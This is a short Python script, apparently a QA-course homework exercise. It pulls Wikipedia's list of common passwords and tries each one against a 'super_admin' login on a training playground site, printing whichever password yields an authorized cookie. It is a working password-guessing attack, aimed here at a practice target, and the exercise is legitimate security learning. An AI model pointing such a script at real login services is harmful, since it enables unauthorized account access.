import pandas
import requests

ds = pandas.read_html("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")[1]

df = ds.drop(columns=ds.iloc[:,range(1)])
paswd = df.to_dict('list')

pass_list = []
for value in paswd.values():
    for i in value:
        if i not in pass_list:
            pass_list.append(i)

#print(pass_list)

for ps in pass_list:
    payload = {"login": "super_admin", "password": ps}
    response1 = requests.post(" https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
    response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)

    if response2.text == "You are authorized":
        print(response2.text)
        print(ps)

